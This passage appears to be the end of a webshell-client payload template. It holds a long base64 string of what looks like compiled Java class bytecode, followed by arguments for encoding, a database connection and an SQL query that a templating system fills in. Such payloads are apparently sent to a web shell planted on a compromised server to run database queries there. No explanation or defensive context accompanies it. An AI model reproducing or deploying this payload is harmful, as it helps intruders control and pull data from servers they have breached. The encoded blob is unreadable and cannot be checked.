HIqK8AAXbUAAiq0AAK2ADkSY7YAZE4tBLYAZS0qtAACtgBmwABdOgQZBLYAORJntgBkOgUZBQS2AGUqGQUZBLYAZsAAXrUAA6cAKE4qKrQAArYAORJiA70ANbYAYSsDvQA3tgA4wABetQADpwAFOgSxAAMAKQBhAGQAHAB0ALMAtgAcALcA1gDZABwAAQCCAAAAYgAYAAAAgQAKAIIAEgCDABwAhAAmAIUAKQCHAC8AiABIAIkAYQCcAGQAigBlAIsAbACMAHQAjgCBAI8AhgCQAJMAkQCfAJIApQCTALMAmgC2AJQAtwCWANYAmQDZAJcA2wCeAAEAjwCGAAEAgQAAAKoABgAFAAAAcioqtAAZtgArTRJoEmkGvQA1WQMSO1NZBLIAalNZBbIAalO2AGFOLQS2AGstKrYAObYAbAa9ADdZAyxTWQQDuABtU1kFLL64AG1TtgA4wAA1OgQZBAS9ADVZAxIqU7YAbgS9ADdZAytTtgA/tgBvsE0rsAABAAAAbgBvABwAAQCCAAAAHgAHAAAAogAJAKMAJgCkACsApQBSAKYAbwCnAHAAqAABAJAAkQABAIEAAADZAAYABgAAAI0BTRItuAAuTi0SMLYAMZsASRIyuAAzOgQZBBJwA70ANbYANgEDvQA3tgA4OgUZBbYAORJxBL0ANVkDEipTtgA2GQUEvQA3WQMrU7YAOMAAO8AAO02nADEScrgAMzoEGQQScwS9ADVZAxIqU7YANhkEtgB0BL0AN1kDK1O2ADjAADvAADtNLLA6BAO8CLAAAQAIAIYAhwAcAAEAggAAADIADAAAAK0AAgCuAAgAsAARALEAGACyAC0AswBUALQAVwC1AF4AtgCFALgAhwC5AIkAugABAJIAAAACAJM=',
    [arg1]: '#{newbase64::encode}',
    [arg2]: '#{newbase64::conn}',
    [arg3]: '#{newbase64::sql}'
  }
})